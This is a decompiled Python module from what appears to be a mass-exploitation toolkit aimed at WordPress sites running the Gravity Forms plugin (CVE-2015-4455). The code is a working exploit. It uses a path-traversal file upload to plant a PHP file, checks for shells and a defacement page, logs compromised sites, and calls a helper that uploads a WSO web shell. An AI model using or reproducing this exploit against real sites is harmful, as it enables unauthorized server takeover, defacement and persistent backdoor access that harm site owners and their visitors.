# uncompyle6 version 2.11.5
# Python bytecode 2.7 (62211)
# Decompiled from: Python 2.7.18 (default, Apr 20 2020, 20:30:41) 
# [GCC 9.3.0]
# Embedded file name: Exploits\CVE_2015_4455_gravityforms.py
import requests
from Exploits import printModule
from Tools import wsoShellUploaderModule
r = '\x1b[31m'
g = '\x1b[32m'
y = '\x1b[33m'
b = '\x1b[34m'
m = '\x1b[35m'
c = '\x1b[36m'
w = '\x1b[37m'
Headers = {'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:28.0) Gecko/20100101 Firefox/28.0'}

def Exploit(site):
    try:
        Grav_checker = requests.get('http://' + site + '/?gf_page=upload', timeout=5, headers=Headers)
        if '"status" : "error"' in str(Grav_checker.content):
            UserAgent = {'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:28.0) Gecko/20100101 Firefox/28.0'}
            fileDeface = {'file': open('files/grav.jpg', 'rb')}
            post_data = {'field_id': '3','form_id': '1','gform_unique_id': '../../../../','name': 'p.php5'}
            url = 'http://' + site + '/?gf_page=upload'
            GoT = requests.post(url, files=fileDeface, data=post_data, headers=UserAgent, timeout=5)
            if '.php5' in str(GoT.content):
                CheckShell = requests.get('http://' + site + '/wp-content/_input_3_p.php5', timeout=10, headers=Headers)
                if 'Vuln!!' in str(CheckShell.content):
                    Checkshell2 = requests.get('http://' + site + '/wp-content/vuln.php', timeout=5, headers=Headers)
                    if 'Vuln!!' in str(Checkshell2.content):
                        Checkshell = requests.get('http://' + site + '/wp-content/vuln.php', timeout=10, headers=Headers)
                        CheckIndex = requests.get('http://' + site + '/vuln.htm', timeout=10, headers=Headers)
                        if 'Vuln!!' in str(Checkshell.content):
                            with open('result/Shell_results.txt', 'a') as writer:
                                writer.write(site + '/wp-content/vuln.php' + '\n')
                            wsoShellUploaderModule.UploadWso2(site + '/wp-content/vuln.php')
                        if 'Vuln!!' in str(CheckIndex.content):
                            with open('result/Index_results.txt', 'a') as writer:
                                writer.write(site + '/vuln.htm' + '\n')
                        return printModule.returnYes(site, 'CVE-2015-4455', 'Gravity forms Shell', 'Wordpress')
                    else:
                        return printModule.returnNo(site, 'CVE-2015-4455', 'Gravity forms Shell', 'Wordpress')

                else:
                    return printModule.returnNo(site, 'CVE-2015-4455', 'Gravity forms Shell', 'Wordpress')
            else:
                return printModule.returnNo(site, 'CVE-2015-4455', 'Gravity forms Shell', 'Wordpress')
        else:
            return printModule.returnNo(site, 'CVE-2015-4455', 'Gravity forms Shell', 'Wordpress')
    except:
        return printModule.returnNo(site, 'CVE-2015-4455', 'Gravity forms Shell', 'Wordpress')